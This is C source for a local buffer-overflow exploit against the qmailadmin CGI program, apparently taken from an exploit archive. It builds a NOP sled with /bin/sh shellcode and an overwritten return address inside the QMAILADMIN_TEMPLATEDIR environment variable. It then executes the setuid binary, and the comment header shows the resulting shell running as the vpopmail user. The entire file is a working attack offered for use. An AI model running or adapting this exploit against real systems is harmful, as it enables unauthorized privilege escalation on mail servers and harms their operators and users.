/* http://www.badc0ded.com (bug found by Thomas Cannon)
 / bash-2.05a$ ./qmailadmin-exp
 / Content-Type: text/html
 / $ id
 / uid=1000(dim) euid=89(vpopmail) gid=1000(dim) egid=89(vchkpw) groups=89(vchkpw), 1000(dim), 0(wheel)
 / $ 
*/


char shellcode[]=          /* 23 bytes                       */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x54"                 /* pushl   %esp                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x50"                 /* pushl   %eax                   */
    "\xb0\x3b"             /* movb    $0x3b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

main ()
{
   char buf[16000];
   int i;
   memset(buf,0,sizeof(buf));
   memset(buf,0x90,5977); 
   strcat(buf,shellcode);

   for (i=0;i<=2203;i++)
     strcat(buf,"\xd8\xef\x06\x08");   // lang_fs magic..
   strcat (buf,"\xf1\xcb\xbf\xbf");	// ret..
   setenv("QMAILADMIN_TEMPLATEDIR",buf);
   execlp("/usr/local/www/cgi-bin.default/qmailadmin/qmailadmin","qmailadmin",0);
   
   
}
